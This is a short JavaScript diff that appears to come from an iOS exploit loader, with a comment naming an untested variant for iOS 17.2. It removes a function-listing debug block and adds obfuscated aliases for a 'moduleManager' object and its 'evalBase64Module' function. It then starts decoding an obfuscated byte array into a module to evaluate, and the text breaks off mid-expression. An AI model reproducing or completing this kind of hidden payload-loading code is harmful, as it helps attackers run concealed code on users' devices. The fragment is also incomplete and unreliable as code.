@@ -1,10 +1,6 @@
 // Variant A for iOS 17.2 is untested, might not work
-try {
-    let methods = Object.getOwnPropertyNames(globalThis.moduleManager).filter(m => typeof globalThis.moduleManager[m] === 'function');
-    alert("Found these functions: " + methods.join(", "));
-} catch (e) {
-    alert("Error sniffing: " + e);
-}
+globalThis.obChTK = globalThis.moduleManager;
+globalThis.moduleManager.fgPoij = globalThis.moduleManager.evalBase64Module;
 
 let r = {};
 globalThis.moduleManager.evalBase64Module(([0, 6, 85, 80, 86, 86, 80, 0, 10, 80, 86, 82, 87, 85, 11, 81, 10, 0, 81, 82, 0, 82, 1, 10, 85, 86, 7, 5, 7, 0, 80, 81, 1, 6, 10, 10, 7, 6, 6, 11].map(x => {
